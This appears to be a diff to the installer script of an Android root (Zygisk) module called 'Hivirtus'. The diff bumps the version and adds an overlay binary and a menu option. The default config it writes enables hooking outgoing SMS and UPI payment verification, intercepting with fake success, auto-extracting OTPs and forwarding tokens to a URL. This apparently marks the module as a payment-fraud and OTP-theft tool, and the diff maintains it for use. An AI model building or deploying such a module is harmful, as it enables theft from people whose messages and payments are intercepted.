@@ -2,7 +2,7 @@
 # Hivirtus Zygisk Mode — Magisk / KernelSU / APatch / SukiSU installer
 
 ui_print "*******************************"
-ui_print "   Hivirtus Zygisk Mode v2.15.1  "
+ui_print "   Hivirtus Zygisk Mode v2.16.0  "
 ui_print "   Zygisk Base Mode By @Hivirtus  "
 ui_print "*******************************"
 
@@ -17,6 +17,7 @@ set_perm_recursive "$MODPATH/zygisk" 0 0 0755 0644
 [ -f "$MODPATH/post-fs-data.sh" ] && set_perm "$MODPATH/post-fs-data.sh" 0 0 0755
 [ -f "$MODPATH/service.sh" ] && set_perm "$MODPATH/service.sh" 0 0 0755
 [ -f "$MODPATH/start_overlay.sh" ] && set_perm "$MODPATH/start_overlay.sh" 0 0 0755
+[ -f "$MODPATH/system/bin/hivirtus-overlay" ] && set_perm "$MODPATH/system/bin/hivirtus-overlay" 0 0 0755
 [ -f "$MODPATH/customize.sh" ] && set_perm "$MODPATH/customize.sh" 0 0 0755
 [ -f "$MODPATH/config.json" ] && set_perm "$MODPATH/config.json" 0 0 0644
 [ -f "$MODPATH/module.prop" ] && set_perm "$MODPATH/module.prop" 0 0 0644
@@ -45,6 +46,7 @@ if [ ! -f "$MODPATH/config.json" ]; then
   "hook_outgoing_sms": true,
   "hook_upi_verification": true,
   "intercept_fake_success": true,
+  "always_show_menu": true,
   "auto_extract_otp": true,
   "auto_forward_token": true,
   "forward_url": "",
@@ -64,12 +66,15 @@ elif [ -f /data/adb/magisk.db ]; then
   ui_print "- Magisk detected"
 elif [ -d /data/adb/apatch ]; then
   ui_print "- APatch detected"
+  ui_print "! Zygote crash = Zygisk inject band"
+  ui_print "! Bubble/HTML menu app_process se chalega"
+  ui_print "! SMS hooks ke liye Zygisk fix karo"
 fi
 
 echo "1" > /data/local/tmp/hivirtus_module_installed.flag
 chmod 644 /data/local/tmp/hivirtus_module_installed.flag 2>/dev/null
 
-ui_print "- Bubble: Zygisk + app_process fallback (auto)"
-ui_print "- Zygisk STOPPED ho to bhi bubble service.sh se start"
-ui_print "- Enable Zygisk in root manager"
+ui_print "- Bubble + HTML menu: ALWAYS ON (no Zygisk needed)"
+ui_print "- Manual start: su -c hivirtus-overlay"
+ui_print "- Zygote crash ho to LSPosed/HMA disable karke try karo"
 ui_print "- Reboot to activate"
